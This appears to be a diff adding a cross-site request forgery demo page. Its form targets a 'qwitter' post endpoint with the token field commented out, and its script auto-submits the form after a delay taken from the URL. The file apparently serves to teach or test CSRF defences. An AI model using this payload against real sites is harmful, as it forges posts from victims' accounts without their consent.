@@ -1,0 +1,20 @@
+<form action="http://www.qwitter.com/post.php" method="post" id="form">
+    <!--input value="some-token-value" name="csrftoken"/-->
+    <input value="Evil message form hacker" name="message" size="22"/>
+    <button>Send</button>
+</form>
+
+<script type="application/javascript">
+    var time = location.search.split(/=/g)[1];
+
+    if (time) {
+        setTimeout(function() {
+            submitForm();
+        }, time);
+    }
+
+    function submitForm() {
+        var form = document.querySelector('#form');
+        form.submit();
+    }
+</script>
